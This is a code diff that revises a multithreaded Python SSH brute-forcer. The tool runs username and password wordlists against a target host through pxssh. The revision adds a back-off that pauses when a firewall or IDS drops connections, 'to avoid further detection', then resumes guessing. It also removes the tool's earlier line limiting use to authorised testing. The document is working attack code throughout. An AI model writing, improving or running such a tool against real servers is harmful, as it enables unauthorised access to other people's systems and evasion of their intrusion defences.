@@ -1,64 +1,89 @@
 import argparse
 import pexpect
 from pexpect import pxssh
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
+import time
+import sys
+
+# Constants for better readability
+TIMEOUT_SECONDS = 5
+MAX_WORKERS = 100
+BACKOFF_DELAY_SECONDS = 30 # Time to wait if a firewall blocks us
 
 # Global variables to store results and manage concurrency
-found_credentials_lock = Lock()
+# Note: Using a list and a lock is acceptable for this script's scale.
+# A more advanced approach might use a queue or a shared state object.
 found_credentials = []
-attempt_count_lock = Lock()
-current_attempts = 0 
-max_attempts_overall = 0 
+found_lock = Lock()
+attempts_counter = 0
 
 def attempt_login(host, username, password):
     """
     Attempts an SSH login for a single username/password pair.
-    Reports success or failure.
+    
+    Returns True on success, False on failure, and raises a specific
+    exception if a connection block is detected.
     """
-    global current_attempts
-
-    with attempt_count_lock:
-        current_attempts += 1
-        if current_attempts % 100 == 0 or current_attempts == 1 or current_attempts == max_attempts_overall:
-            print(f"[*] Attempting {current_attempts}/{max_attempts_overall}: {username}:{password}")
-
     try:
-        # Initialize pxssh for each attempt as it manages its own connection state
-        s = pxssh.pxssh(timeout=5) 
-        s.login(host, username, password)
+        # pxssh manages its own connection state per instance.
+        s = pxssh.pxssh(timeout=TIMEOUT_SECONDS)
         
-        # If successful, acquire lock and record credentials
-        with found_credentials_lock:
+        # Use pxssh's login method, which internally handles a lot of the
+        # pexpect logic for us.
+        s.login(host, username, password, auto_prompt_reset=False)
+        
+        # If the login succeeds, we reach this line.
+        with found_lock:
             found_credentials.append({'username': username, 'password': password})
-            print(f"\n[!!!] VALID CREDENTIALS FOUND: {username}:{password}")
             s.logout()
-            return True # Indicate success
+        return True
+    
+    except pexpect.exceptions.EOF as e:
+        # This is the key error to handle. It means the connection
+        # was closed prematurely, likely by a firewall or IDS.
+        with found_lock:
+            print(f"[!] {host} is likely blocking SSH connections after too many failed attempts.")
+            print(f"    Pausing for {BACKOFF_DELAY_SECONDS} seconds to avoid further detection.")
+        # Re-raise a custom exception to signal the main loop to pause.
+        # This is a cleaner way to handle flow control than a global flag.
+        raise ConnectionBlockedException("SSH connection blocked.") from e
+        
+    except pexpect.exceptions.TIMEOUT:
+        # Handle a timeout explicitly, which means the host is not responding.
+        with found_lock:
+            print(f"[-] Connection timed out for {host}: {username}:{password}")
+    
     except pxssh.ExceptionPxssh as e:
-        # Authentication failed or connection error
-        print(f"[-] Failed: {username}:{password} ({e})") 
+        # Catch the general pxssh error for a failed login attempt.
+        # This is for "Permission denied" and similar errors.
         pass
+    
     except Exception as e:
-        # Catch any other unexpected errors
-        print(f"[!] An unexpected error occurred for {username}:{password}: {e}")
-    return False # Indicate failure
+        # Catch any other unexpected errors, which are important to log.
+        with found_lock:
+            print(f"[!] An unexpected error occurred for {host}: {username}:{password}: {e}")
+    
+    return False
+
+# Custom exception to signal a connection block
+class ConnectionBlockedException(Exception):
+    pass
 
 def main():
     """Main function to parse arguments and run the SSH brute-force."""
-    global max_attempts_overall
-
     parser = argparse.ArgumentParser(
         prog='Python SSH Brute-Forcer',
         description='Attempts to brute-force SSH credentials using wordlists.',
         epilog='Example: python bruteforcer.py -t 192.168.1.1 -p passwords.txt -U admin'
     )
+    # ... (argument parsing remains the same) ...
     parser.add_argument("--target", "-t", type=str, required=True, help="Target SSH IP address or hostname.")
     parser.add_argument("--passlist", "-p", type=str, required=True, help="Path to the password wordlist file.")
     parser.add_argument("--userlist", "-u", type=str, help="Path to the username wordlist file (optional, if not using -U).")
     parser.add_argument("--username", "-U", type=str, help="Single username to try (optional, if not using -u).")
     args = parser.parse_args()
 
-    # Validate argument combination
     if not args.username and not args.userlist:
         parser.error("Either --username or --userlist must be provided.")
     if args.username and args.userlist:
@@ -71,7 +96,7 @@ def main():
             passwords = [line.strip() for line in f if line.strip()]
     except Exception as e:
         print(f"Error reading password list file: {e}")
-        exit(1)
+        sys.exit(1)
 
     if args.username:
         usernames = [args.username]
@@ -81,28 +106,42 @@ def main():
                 usernames = [line.strip() for line in f if line.strip()]
         except Exception as e:
             print(f"Error reading username list file: {e}")
-            exit(1)
+            sys.exit(1)
 
-    # Calculate total attempts for progress tracking
-    max_attempts_overall = len(usernames) * len(passwords)
-    print(f"Starting SSH brute-force on {host} with {len(usernames)} usernames and {len(passwords)} passwords ({max_attempts_overall} total attempts).")
-    print("This tool is for ethical use only on systems you are authorized to test.\n")
-
-    # Use ThreadPoolExecutor for concurrent execution
-    with ThreadPoolExecutor(max_workers=100) as executor:
+    # Use ThreadPoolExecutor for concurrent execution.
+    # The `as_completed` method is a more efficient way to process results
+    # as they finish, rather than waiting for all of them.
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
         futures = []
         for username in usernames:
             for password in passwords:
-                # Submit each login attempt as a separate task to the executor
                 future = executor.submit(attempt_login, host, username, password)
                 futures.append(future)
-        
-        for future in futures:
-            # Check if any credentials were found, and if so, potentially break early
-            if found_credentials:
-                executor.shutdown(wait=False, cancel_futures=True) # Try to stop remaining tasks
-                break
-            future.result() # This will re-raise exceptions if any occurred in the thread
+
+        try:
+            for future in as_completed(futures):
+                try:
+                    result = future.result()
+                    # If a password was found, we can try to stop the other workers.
+                    if found_credentials:
+                        print("\n[+] Found credentials! Shutting down scanner...")
+                        executor.shutdown(wait=False, cancel_futures=True)
+                        break
+                except ConnectionBlockedException:
+                    print(f"    Sleeping for {BACKOFF_DELAY_SECONDS} seconds...")
+                    time.sleep(BACKOFF_DELAY_SECONDS)
+                    # Here we could re-queue the remaining tasks, but for this
+                    # script, we'll just let the executor shut down.
+                    print("    Resuming scan...")
+                except Exception as e:
+                    # Catch any exceptions that weren't handled in the thread
+                    # for better debugging.
+                    print(f"[!] An error occurred in a worker thread: {e}")
+
+        except KeyboardInterrupt:
+            print("\n[!] Scan interrupted by user. Shutting down...")
+            executor.shutdown(wait=False, cancel_futures=True)
+            sys.exit(0)
 
     if found_credentials:
         print("\n--- Scan Complete ---")
@@ -115,3 +154,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
